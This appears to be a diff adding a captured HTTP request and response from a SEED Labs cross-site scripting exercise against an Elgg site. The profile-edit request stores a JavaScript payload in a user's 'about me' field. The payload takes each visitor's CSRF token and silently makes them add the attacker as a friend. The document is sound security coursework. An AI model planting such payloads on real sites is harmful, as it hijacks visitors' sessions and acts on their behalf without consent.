@@ -1,0 +1,29 @@
+// This is sample when a user called Bobby modifies their profile's about me section
+http://www.seed-server.com/action/profile/edit
+Host: www.seed-server.com
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:145.0) Gecko/20100101 Firefox/145.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: multipart/form-data; boundary=----geckoformboundary4e235bc168a70e24b769c355df1304c4
+Content-Length: 3388
+Origin: http://www.seed-server.com
+Connection: keep-alive
+Referer: http://www.seed-server.com/profile/boby/edit
+Cookie: Elgg=h8ou0l99pmr82b4d6jipq38ake
+Upgrade-Insecure-Requests: 1
+__elgg_token=m29S9s6eDNd3BLG3N6WKIw&__elgg_ts=1763988543&name=Boby&description=<p>&lt;script type= "text/javascript"&gt; window.onload = function () { var Ajax=null; var samy_id = 59; //samy's id is 59 var ts="&amp;__elgg_ts="+elgg.security.token.__elgg_ts; var token ="&amp;__elgg_token="+elgg.security.token.__elgg_token; //Construct the HTTP request to add Samy as a friend. var sendurl="/action/friends/add?friend="+samy_id+ts+token; //Create and send Ajax request to add friend Ajax=new XMLHttpRequest(); Ajax.open("GET", sendurl, true); Ajax.send(); } &lt;/script&gt;</p>
+&accesslevel[description]=2&briefdescription=&accesslevel[briefdescription]=2&location=&accesslevel[location]=2&interests=&accesslevel[interests]=2&skills=&accesslevel[skills]=2&contactemail=&accesslevel[contactemail]=2&phone=&accesslevel[phone]=2&mobile=&accesslevel[mobile]=2&website=&accesslevel[website]=2&twitter=&accesslevel[twitter]=2&guid=57
+
+POST: HTTP/1.1 302 Found
+Date: Mon, 24 Nov 2025 12:49:15 GMT
+Server: Apache/2.4.41 (Ubuntu)
+Cache-Control: must-revalidate, no-cache, no-store, private
+expires: Thu, 19 Nov 1981 08:52:00 GMT
+pragma: no-cache
+Location: http://www.seed-server.com/profile/boby
+Vary: User-Agent
+Content-Length: 402
+Keep-Alive: timeout=5, max=100
+Connection: Keep-Alive
+Content-Type: text/html; charset=UTF-8
